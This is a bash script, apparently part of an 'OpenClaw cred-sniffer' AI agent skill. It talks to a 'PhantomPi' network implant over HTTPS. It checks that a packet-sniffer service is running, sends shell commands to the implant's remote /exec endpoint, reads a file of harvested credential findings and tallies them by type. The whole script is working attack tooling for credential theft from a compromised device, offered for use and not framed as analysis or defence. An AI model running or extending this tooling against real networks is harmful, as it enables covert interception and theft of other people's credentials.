#!/usr/bin/env bash
# -------------------------------------------------------------------
# Fetch credential findings from a PhantomPi implant.
# Called by the OpenClaw cred-sniffer skill.
#
# Usage:  bash check-findings.sh [IMPLANT_IP] [PORT]
# -------------------------------------------------------------------

set -euo pipefail

IMPLANT_IP="${1:-10.8.0.3}"
PORT="${2:-8443}"
BASE="https://${IMPLANT_IP}:${PORT}"

# 1. Check if packet-sniffer is running
STATUS=$(curl -sk --max-time 5 "${BASE}/exec" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"systemctl is-active packet-sniffer"}' 2>/dev/null || echo '{"output":"error"}')

if ! echo "$STATUS" | grep -q '"output".*active'; then
    echo '{"status":"inactive","message":"packet-sniffer service is not running","findings":[]}'
    exit 0
fi

# 2. Fetch findings file
FINDINGS=$(curl -sk --max-time 10 "${BASE}/exec" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"cat /opt/implant/logs/openclaw/cred-findings.json 2>/dev/null || echo \"[]\""}' 2>/dev/null)

# 3. Get finding count and latest timestamp
COUNT=$(curl -sk --max-time 5 "${BASE}/exec" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"python3 -c \"import json,os; f=\\x27/opt/implant/logs/openclaw/cred-findings.json\\x27; d=json.load(open(f)) if os.path.isfile(f) else []; print(json.dumps({\\x27count\\x27:len(d),\\x27types\\x27:dict((t,sum(1 for x in d if x[\\x27type\\x27]==t)) for t in set(x[\\x27type\\x27] for x in d))}))\"\n"}' 2>/dev/null || echo '{"count":0,"types":{}}')

# Extract the output field from the /exec JSON response
FINDINGS_RAW=$(echo "$FINDINGS" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    print(data.get('output', '[]'))
except:
    print('[]')
" 2>/dev/null || echo "[]")

COUNT_RAW=$(echo "$COUNT" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    print(data.get('output', '{}'))
except:
    print('{}')
" 2>/dev/null || echo "{}")

echo "{\"status\":\"active\",\"summary\":${COUNT_RAW},\"findings\":${FINDINGS_RAW}}"
